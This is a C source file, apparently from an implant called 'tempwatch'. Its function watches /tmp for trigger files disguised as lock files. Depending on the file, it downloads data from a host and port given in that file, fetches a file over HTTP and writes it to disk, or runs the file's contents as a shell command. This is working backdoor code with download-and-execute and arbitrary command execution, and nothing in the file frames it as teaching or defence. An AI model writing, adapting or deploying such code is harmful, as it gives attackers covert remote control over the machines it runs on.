#include "tempwatch.h"

int check_temp_tasks()
{
    char request[1124];
    char inbuff[1024];
    FILE *fh;
    int tmp;
  char thisstr[] = "this";

  
  char ip[1024];
  char outpath[1024];
  char torequest[900];
  int port;
  int sockfd;
  struct sockaddr_in servaddr;



  if (file_exists("/tmp/ABC"))
  { // Basic Test
    fh = fopen("/tmp/sawabc", "w");
    fwrite(thisstr, 1, sizeof(thisstr), fh);
    fclose(fh);

    unlink("/tmp/ABC");
  }

  if (file_exists("/tmp/ANDOR"))
  { // Test Command
    runtask("/usr/bin/touch /tmp/systemcall\\ worked");

    unlink("/tmp/ANDOR");
  }

  if (file_exists("/tmp/X9999-lock"))
  { // Connect to socket and write to file
    fh = fopen("/tmp/X9999-lock", "r");
    if (fh == NULL)
    {
#ifdef TESTING
      printf("Failed to open the file\n");
#endif
    }
    else
    {
#ifdef TESTING
      printf("File opened ok.  Reading\n");
#endif
    }
    fflush(stdout);
    fgets(inbuff, sizeof(inbuff), fh);
    fclose(fh);
#ifdef TESTING
    printf("About to parse %s\n", inbuff);
#endif
    // Parse inbuff for addr and port separated by space
    if (sscanf(inbuff, "%100s %d %100s", ip, &port, outpath) != 3)
    {
//       if (0) {
#ifdef TESTING
      printf("Error parsing host and port and path");
#endif
    }
    else
    {
#ifdef TESTING
      printf("ip is: %s\nport is: %d\noutpath is: %s\n", ip, port, outpath);
#endif
      sockfd = socket(AF_INET, SOCK_STREAM, 0);
      if (sockfd < 0)
      {
#ifdef TESTING
        printf("Error opening socket\n");
#endif
      }
      // bzero(&servaddr, sizeof(servaddr));  //Commented but may need it.
      servaddr.sin_family = AF_INET;
      servaddr.sin_addr.s_addr = inet_addr(ip);
      servaddr.sin_port = htons(port);

      int tmp = connect(sockfd, (struct sockaddr *)&servaddr, sizeof(servaddr));

      if (tmp < 0)
      {
#ifdef TESTING
        printf("Socket Error\n");
#endif
        close(sockfd);
      }
      else
      {
        unlink(outpath);
        fh = fopen(outpath, "wb");
        tmp = 1;

        while (tmp > 0)
        {
          tmp = recv(sockfd, inbuff, sizeof(inbuff), 0);
#ifdef TESTING
          printf("Received %d bytes\n", tmp);
#endif
          if (tmp > 0)
          {
            int tmp2 = fwrite(inbuff, sizeof(char), tmp, fh);
#ifdef TESTING
            printf("Wrote %d bytes\n", tmp2);
#endif
          }
        } // while tmp
        fclose(fh);
      } // else of connect failed
    }   // Else on parsing
    unlink("/tmp/X9999-lock");
  } // End of X9999-lock - Connect and download

  // Web Request and write file
  if (file_exists("/tmp/X9997-lock"))
  {

    fh = fopen("/tmp/X9997-lock", "r");
    if (fh == NULL)
    {
#ifdef TESTING
      printf("Failed to open the file\n");
#endif
    }
    else
    {
#ifdef TESTING
      printf("File opened ok.  Reading\n");
#endif
    }

    fflush(stdout);
    fgets(inbuff, sizeof(inbuff), fh);

    fclose(fh);
#ifdef TESTING
    printf("About to parse %s\n", inbuff);
#endif

    // Parse inbuff for addr and port separated by space
    if (sscanf(inbuff, "%100s %d %100s %100s", ip, &port, torequest, outpath) != 4)
    {
//       if (0) {
#ifdef TESTING
      printf("Error parsing host and port and path");
#endif
    }
    else
    {
#ifdef TESTING
      printf("ip is: %s\nport is: %d\nrequest is: %s\noutpath is: %s\n", ip, port, torequest, outpath);
#endif
      sockfd = socket(AF_INET, SOCK_STREAM, 0);
      if (sockfd < 0)
      {
#ifdef TESTING
        printf("Error opening socket\n");
#endif
      }
      // bzero(&servaddr, sizeof(servaddr));  //Commented but may need it.
      servaddr.sin_family = AF_INET;
      servaddr.sin_addr.s_addr = inet_addr(ip);
      servaddr.sin_port = htons(port);

      int tmp = connect(sockfd, (struct sockaddr *)&servaddr, sizeof(servaddr));

      if (tmp < 0)
      {
#ifdef TESTING
        printf("Socket Error\n");
#endif
        close(sockfd);
      }
      else
      {
        // Send request
        _snprintf(request, sizeof(request), "GET %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n", torequest, ME);
        send(sockfd, request, strlen(request), 0);
        // Sleep(1000);
        sleep(1);
        int tmp = recv(sockfd, inbuff, sizeof(inbuff), 0); // probably have the full header portion here.
        // Find the Content-Length
        int toread = get_content_length(inbuff);
        if (toread == -1)
        {
#ifdef TESTING
          printf("didn't find content-length\n");
#endif
        }

        unlink(outpath); // Delete if already exists
        fh = fopen(outpath, "w");

        int sofar = 0;

        char *start = strstr(inbuff, "\r\n\r\n");
        if (start == NULL)
        {
#ifdef TESTING
          printf("Couldn't find the boundary between response and body\n");
#endif
        }
        start += 4; // Get past the \r\n\r\n
        int len_of_header = (unsigned long int)start - (unsigned long int)inbuff;

        int tmp2 = fwrite(start, sizeof(char), tmp - len_of_header, fh);
#ifdef TESTING
        printf("Wrote %d bytes\n", tmp2);
#endif
        sofar = tmp2;

        while (sofar < toread)
        {
          // Sleep(100);
          sleep(1); // This may be too long for effective comms.
          tmp = recv(sockfd, inbuff, sizeof(inbuff), 0);
#ifdef TESTING
          printf("Received %d bytes\n", tmp);
#endif
          sofar += tmp;

          if (tmp > 0)
          {
            tmp2 = fwrite(inbuff, sizeof(char), tmp, fh);
#ifdef TESTING
            printf("Wrote %d bytes\n", tmp2);
#endif
          }
        }
#ifdef TESTING
        printf("Done writing, closing file");
#endif
        fclose(fh);
      }
    } // good parse
    unlink("/tmp/X9997-lock");
  } // End of X9997-lock - Web Request

  if (file_exists("/tmp/X9998-lock"))
  { // Execute the command in the file
    fh = fopen("/tmp/X9998-lock", "r");
    tmp = fread(&inbuff, sizeof(char), sizeof(inbuff), fh);

    runtask(inbuff);
    fclose(fh);

    unlink("/tmp/X9998-lock");
  }
}